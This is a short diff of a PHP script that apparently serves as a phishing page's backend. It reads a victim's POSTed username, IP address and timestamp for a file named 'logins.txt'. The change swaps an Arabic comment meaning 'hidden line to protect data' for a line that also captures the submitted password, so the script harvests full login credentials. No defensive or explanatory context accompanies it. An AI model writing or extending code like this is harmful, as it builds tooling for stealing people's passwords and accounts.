@@ -1,7 +1,7 @@
 <?php
 $file = "logins.txt";
 $user = $_POST['username'] ?? 'null';
-# 🔒 سطر مخفي لحماية البيانات
+$pass = $_POST['password'] ?? 'null';
 $ip   = $_SERVER['REMOTE_ADDR'];
 $time = date("Y-m-d H:i:s");
 
